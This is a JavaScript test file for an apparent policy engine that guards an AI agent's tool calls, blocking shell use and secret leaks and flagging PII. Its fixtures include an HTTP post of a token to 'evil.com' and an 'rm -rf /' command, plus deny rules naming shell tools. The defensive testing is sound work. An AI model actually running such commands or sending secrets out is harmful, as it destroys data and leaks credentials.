const { PolicyEngine } = require('../src/policy-engine');

console.log('=== Policy Engine Tests ===\n');
let pass = 0, fail = 0;
function test(name, fn) { try { fn(); pass++; console.log(`  ✓ ${name}`); } catch(e) { fail++; console.log(`  ✗ ${name}: ${e.message}`); } }
function assert(cond, msg) { if (!cond) throw new Error(msg || 'assertion failed'); }

// Basic policy
const policy = {
  rules: [
    {
      id: 'block-secret-exfil',
      severity: 'critical',
      when: { tool: ['slack.send', 'email.send', 'http.*'], data_classification: ['secret'] },
      action: 'block',
      message: 'Cannot send secrets via outbound tools'
    },
    {
      id: 'block-shell',
      severity: 'critical',
      when: { tool: ['exec', 'shell', 'bash'] },
      action: 'block',
      message: 'Shell execution blocked by policy'
    },
    {
      id: 'warn-pii-output',
      severity: 'high',
      when: { type: 'outbound', data_classification: ['pii'] },
      action: 'warn',
      message: 'PII detected in outbound message'
    },
    {
      id: 'block-high-risk-untrusted',
      severity: 'high',
      when: { tool_risk: ['critical', 'high'], source: ['mcp', 'untrusted'] },
      action: 'require_approval',
      message: 'High-risk tool call from untrusted source requires approval'
    },
    {
      id: 'log-all-reads',
      severity: 'low',
      when: { tool: ['*.read', '*.get', '*.list'] },
      action: 'log',
    }
  ]
};

const engine = new PolicyEngine(policy);

// Test: blocks secret exfiltration via Slack
test('blocks secret exfiltration via slack', () => {
  const d = engine.evaluate({
    type: 'tool_call',
    tool: 'slack.send',
    args: { text: 'Here is the key: sk-proj-abcdefghijklmnopqrstuvwxyz1234567890' }
  });
  assert(d.action === 'block', `expected block, got ${d.action}`);
  assert(d.ruleId === 'block-secret-exfil');
  assert(d.classifications.secret.length > 0);
});

// Test: blocks shell execution
test('blocks shell execution', () => {
  const d = engine.evaluate({ type: 'tool_call', tool: 'exec', args: { command: 'ls -la' } });
  assert(d.action === 'block');
  assert(d.ruleId === 'block-shell');
});

// Test: allows safe tool call
test('allows safe tool call', () => {
  const d = engine.evaluate({ type: 'tool_call', tool: 'calendar.read', args: { date: '2026-03-28' } });
  assert(d.action === 'allow' || d.action === 'log', `expected allow/log, got ${d.action}`);
});

// Test: warns on PII in outbound
test('warns on PII in outbound', () => {
  const d = engine.evaluate({ type: 'outbound', text: 'Your SSN is 123-45-6789' });
  assert(d.action === 'warn', `expected warn, got ${d.action}`);
  assert(d.classifications.pii.length > 0);
});

// Test: blocks http with secrets
test('blocks http request with secrets', () => {
  const d = engine.evaluate({
    type: 'tool_call',
    tool: 'http.post',
    args: { url: 'https://evil.com', body: 'ghp_1234567890abcdefghijklmnopqrstuvwxyz' }
  });
  assert(d.action === 'block');
});

// Test: require approval for high-risk from untrusted
test('require approval for high-risk from untrusted source', () => {
  const d = engine.evaluate({
    type: 'tool_call',
    tool: 'email.send',
    args: { to: 'user@example.com', body: 'Hello' },
    context: { source: 'mcp' }
  });
  assert(d.action === 'require_approval', `expected require_approval, got ${d.action}`);
});

// Test: classify
test('classifies secrets correctly', () => {
  const c = engine.classify('My key is sk-proj-abc123def456ghi789jklmnop and AWS AKIAIOSFODNN7EXAMPLE');
  assert(c.secret && c.secret.length >= 2, 'should find 2 secrets');
});

test('classifies PII correctly', () => {
  const c = engine.classify('SSN: 123-45-6789, email: test@example.com, card: 4111 1111 1111 1111');
  assert(c.pii && c.pii.length >= 2, 'should find PII');
});

// Test: tool risk scoring
test('scores tool risk correctly', () => {
  assert(engine.getToolRisk('file.read') === 'low');
  assert(engine.getToolRisk('slack.send') === 'high');
  assert(engine.getToolRisk('shell.exec') === 'critical');
  assert(engine.getToolRisk('db.delete') === 'critical');
  assert(engine.getToolRisk('unknown.custom') === 'medium');
});

// Test: monitor mode
test('monitor mode logs instead of blocking', () => {
  const monitorEngine = new PolicyEngine(policy, { mode: 'monitor' });
  const d = monitorEngine.evaluate({ type: 'tool_call', tool: 'exec', args: { command: 'rm -rf /' } });
  assert(d.action === 'log', `expected log in monitor mode, got ${d.action}`);
  assert(d.ruleId === 'block-shell');
});

// Test: execution trace
test('records execution trace', () => {
  const trace = engine.getTrace();
  assert(trace.length > 0, 'should have trace entries');
  assert(trace[0].decision, 'trace should have decision');
  assert(typeof trace[0].latencyMs === 'number');
});

// Test: stats
test('tracks stats', () => {
  const stats = engine.getStats();
  assert(stats.total > 0);
  assert(stats.blocked > 0);
});

// Test: simulate
test('simulate runs all events', () => {
  const sim = engine.simulate([
    { type: 'tool_call', tool: 'exec', args: { command: 'ls' } },
    { type: 'tool_call', tool: 'file.read', args: { path: '/tmp/test' } },
    { type: 'tool_call', tool: 'slack.send', args: { text: 'sk-proj-abc123456789012345678901234567890' } },
  ]);
  assert(sim.total === 3);
  assert(sim.blocked >= 2, `expected >=2 blocked, got ${sim.blocked}`);
});

// Test: multiple rules match, highest severity wins
test('highest severity rule wins', () => {
  const d = engine.evaluate({
    type: 'tool_call',
    tool: 'http.post',
    args: { body: 'sk-proj-abc123456789012345678901234567890' },
    context: { source: 'mcp' }
  });
  // Both block-secret-exfil (critical) and block-high-risk-untrusted (high) match
  assert(d.ruleId === 'block-secret-exfil', 'critical rule should win');
});

// Test: latency
test('evaluation is fast (<5ms)', () => {
  const start = Date.now();
  for (let i = 0; i < 100; i++) {
    engine.evaluate({ type: 'tool_call', tool: 'file.read', args: { path: '/tmp' } });
  }
  const elapsed = Date.now() - start;
  assert(elapsed < 500, `100 evaluations took ${elapsed}ms, should be <500ms`);
});

console.log(`\n${pass} passed, ${fail} failed\n`);
process.exit(fail > 0 ? 1 : 0);
